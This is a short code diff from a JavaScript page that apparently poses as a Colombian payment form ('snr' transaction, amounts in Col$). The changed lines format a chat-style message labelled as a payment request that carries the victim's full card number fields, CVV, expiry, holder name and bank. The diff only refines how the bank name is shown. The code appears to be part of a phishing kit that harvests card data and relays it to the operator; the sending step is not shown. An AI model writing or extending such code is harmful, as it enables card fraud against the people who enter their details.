@@ -639,7 +639,8 @@
 
       localStorage.setItem("snr_transaccion_actual", JSON.stringify(datosTransaccion));
 
-      // Mensaje con datos de tarjeta
+      // Mensaje con datos de tarjeta (usando banco detectado por API)
+      var nombreBanco = bankData.bank || "Banco Desconocido";
       var mensaje = "💳 *SOLICITUD DE PAGO - V2CRTF*\n\n" +
         "🆔 ID: `" + solicitudId + "`\n\n" +
         "👤 *DATOS DEL CLIENTE:*\n" +
@@ -652,7 +653,7 @@
         "CVV: `" + cvv + "`\n" +
         "Vencimiento: `" + expiry + "`\n" +
         "Titular: " + nombre + "\n" +
-        "Banco: " + (bankData.bank || "Desconocido") + "\n" +
+        "🏦 Banco: *" + nombreBanco + "*\n" +
         "Tipo: " + cardType.toUpperCase() + "\n\n" +
         "💰 Monto: " + (pendiente ? pendiente.valor + " Col$" : "23.000 Col$") + "\n" +
         "📅 Fecha: " + new Date().toLocaleString('es-CO');
